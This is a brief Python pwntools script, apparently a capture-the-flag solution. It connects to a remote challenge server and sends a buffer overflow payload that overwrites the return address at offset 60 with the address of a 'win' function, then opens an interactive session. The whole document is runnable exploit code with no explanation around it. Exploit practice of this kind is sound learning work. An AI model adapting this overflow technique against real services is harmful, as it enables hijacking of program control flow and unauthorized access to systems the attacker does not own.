from pwn import *

elf = context.binary = ELF('./server')

p = remote('thekidofarcrania.com', 4902)

offset = 60

payload = flat({offset: [elf.sym.win]})

p.sendline(payload)
p.interactive()
